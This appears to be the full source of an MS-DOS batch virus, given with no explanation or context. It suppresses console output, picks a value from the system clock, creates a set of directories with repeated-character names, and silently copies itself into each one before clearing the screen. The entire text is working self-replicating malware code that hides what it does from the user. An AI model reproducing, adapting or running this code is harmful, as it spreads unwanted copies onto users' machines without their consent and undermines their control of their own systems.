@ctty nul
set a=if errorlevel 1 goto
set b=if not errorlevel 1 set _
set c=goto fun
:0
ver|time|find ",0">nul
%a% 9|%b%=0
%c%
:9
ver|time|find ",9">nul
%a% 8|%b%=9
%c%
:8
ver|time|find ",8">nul
%a% 7|%b%=8
%c%
:7
ver|time|find ",7">nul
%a% 6|%b%=7
%c%
:6
ver|time|find ",6">nul
%a% 5|%b%=6
%c%
:5
ver|time|find ",5">nul
%a% 4|%b%=5
%c%
:4
ver|time|find ",4">nul
%a% 3|%b%=4
%c%
:3
ver|time|find ",3">nul
%a% 2|%b%=3
%c%
:2
ver|time|find ",2">nul
%a% 1|%b%=2
%c%
:1
ver|time|find ",1">nul
%a% 0|%b%=1
:fun
for %%_ in (%_%;%_%%_%;%_%%_%%_%;%_%%_%%_%%_%;%_%%_%%_%%_%%_%;%_%%_%%_%%_%%_%%_%;%_%%_%%_%%_%%_%%_%%_%) do md %%_%_%%%_>nul
for %%_ in (%_%;%_%%_%;%_%%_%%_%;%_%%_%%_%%_%;%_%%_%%_%%_%%_%;%_%%_%%_%%_%%_%%_%;%_%%_%%_%%_%%_%%_%%_%) do copy %0 %%_%_%%%_>nul
cls